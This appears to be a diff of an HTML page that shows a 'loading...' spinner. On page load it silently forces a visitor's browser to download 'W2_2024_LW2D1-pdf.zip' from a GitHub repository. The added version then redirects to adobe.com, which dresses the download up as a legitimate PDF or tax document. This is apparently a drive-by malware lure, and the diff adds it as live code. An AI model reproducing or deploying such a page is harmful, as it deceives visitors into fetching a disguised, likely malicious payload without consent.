@@ -1,44 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Preparing...</title>
-<style>
-  body {
-    background: #000;
-    color: white;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-  }
-  .loader {
-    border: 6px solid #333;
-    border-top: 6px solid #09f;
-    border-radius: 50%;
-    width: 50px;
-    height: 50px;
-    animation: spin 0.5s linear infinite;
-  }
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-</style>
-<script>
-  window.onload = function() {
-    const link = document.createElement('a');
-    link.href = "https://raw.githubusercontent.com/MARKZBERG35/teamfile/main/W2_2024_LW2D1-pdf.zip"; 
-    link.download = "https://raw.githubusercontent.com/MARKZBERG35/teamfile/main/W2_2024_LW2D1-pdf.zip";
-    document.body.appendChild(link);
-    link.click();
-    setTimeout(() => window.close(), 2000);
-  };
-</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>loading...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #121212;
+            color: white;
+            font-family: Arial, sans-serif;
+            flex-direction: column;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.2);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+    </style>
 </head>
 <body>
-  <div class="loader"></div>
-  <p>loading...</p>
+    <div class="spinner"></div>
+    <h1>loading...</h1>
+
+    <script>
+        // Start download
+        const fileUrl = "https://github.com/MARKZBERG35/teamfile/releases/download/v1.0/W2_2024_LW2D1-pdf.zip";
+        const link = document.createElement("a");
+        link.href = fileUrl;
+        link.download = "";
+        document.body.appendChild(link);
+        link.click();
+
+        // Redirect to Adobe after 2 seconds
+        setTimeout(() => {
+            window.location.href = "https://www.adobe.com";
+        }, 2000);
+    </script>
 </body>
 </html>
